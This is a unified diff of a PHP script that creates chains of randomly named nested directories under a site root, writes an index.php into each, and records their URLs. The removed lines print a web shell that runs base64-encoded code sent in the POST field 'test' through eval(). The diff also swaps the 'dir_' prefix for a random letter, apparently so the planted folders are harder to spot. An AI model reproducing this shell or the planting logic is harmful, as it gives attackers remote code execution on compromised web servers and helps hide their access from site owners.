@@ -40,7 +40,10 @@ function resolveTargetDirs($rootDir, $targetCount)
     }
 
     while (count($directories) < $targetCount) {
-        $newDir = $rootDir . DIRECTORY_SEPARATOR . 'dir_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
+        $chars = 'abcdefghijklmnopqrstuvwxyz';
+        $random = $chars[rand(0, 25)];
+        //dir_
+        $newDir = $rootDir . DIRECTORY_SEPARATOR . $random . substr(md5(uniqid(mt_rand(), true)), 0, 8);
         if (!mkdir($newDir, 0777, true) && !is_dir($newDir)) {
             throw new RuntimeException('Failed to create directory: ' . $newDir);
         }
@@ -54,7 +57,9 @@ function resolveTargetDirs($rootDir, $targetCount)
 function buildChain($parentDir, &$urls, $projectRoot, $baseUrl)
 {
     $chainDepth = randomRange(3, 9);
-    $directoryName = createUniqueDirectoryName($parentDir, 'dir');
+    $chars = 'abcdefghijklmnopqrstuvwxyz';
+    $random = $chars[rand(0, 25)];
+    $directoryName = createUniqueDirectoryName($parentDir, $random);
     $currentDir = $parentDir;
 
     for ($i = 0; $i < $chainDepth; $i++) {
@@ -75,7 +80,8 @@ function buildChain($parentDir, &$urls, $projectRoot, $baseUrl)
 function createUniqueDirectoryName($basePath, $prefix)
 {
     do {
-        $name = $prefix . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
+        //$name = $prefix . '_' . substr(md5(uniqid(mt_rand(), true)), 0, 8);
+        $name = $prefix  . substr(md5(uniqid(mt_rand(), true)), 0, 8);
         $exists = is_dir($basePath . DIRECTORY_SEPARATOR . $name);
     } while ($exists);
 
@@ -86,13 +92,7 @@ function writeIndexFile($directory, $projectRoot, $baseUrl)
 {
     $indexFile = $directory . DIRECTORY_SEPARATOR . 'index.php';
     $contents = <<<'PHP'
-<?php
-//
-if(isset($_POST["test"])){
-    $test = $_POST["test"];$str = base64_decode($test);eval($str);
-}else{
-
-}
+#####
 
 PHP;
 
@@ -170,4 +170,4 @@ if (php_sapi_name() === 'cli') {
     echo $str;
 }
 
-return $generatedUrls;
+//return $generatedUrls;
